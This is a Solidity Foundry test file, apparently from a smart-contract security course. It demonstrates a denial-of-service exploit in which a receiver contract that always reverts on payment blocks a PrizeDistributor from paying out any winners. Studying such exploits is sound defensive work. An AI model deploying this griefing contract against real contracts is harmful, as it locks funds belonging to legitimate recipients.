// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {PrizeDistributor} from "../../src/Week1/Day5_DoS.sol";


contract MaliciousReceiver  {
    receive() external payable{
        revert("I refuse to accept money");
    }
}

contract PrizeDistributorTest is Test{
    PrizeDistributor public prizeDistributor;
    MaliciousReceiver  public attacker;
    address internal constant WINNER_A = address(1);
    address internal constant WINNER_B = address(2);

    function setUp() external {
        prizeDistributor = new PrizeDistributor();
        attacker  = new MaliciousReceiver ();
    }

    function test_exploit() external{
        uint256 prizePool = 10 ether;
        vm.deal(address(this), prizePool);
        prizeDistributor.deposit{value: prizePool}();

        address[] memory winners = new address[](3);
        winners[0] = WINNER_A;
        winners[1] = address(attacker);
        winners[2] = WINNER_B;
        prizeDistributor.setWinners(winners);
        vm.expectRevert();
        prizeDistributor.distribute();

        assertEq(address(prizeDistributor).balance, prizePool);
    }
}

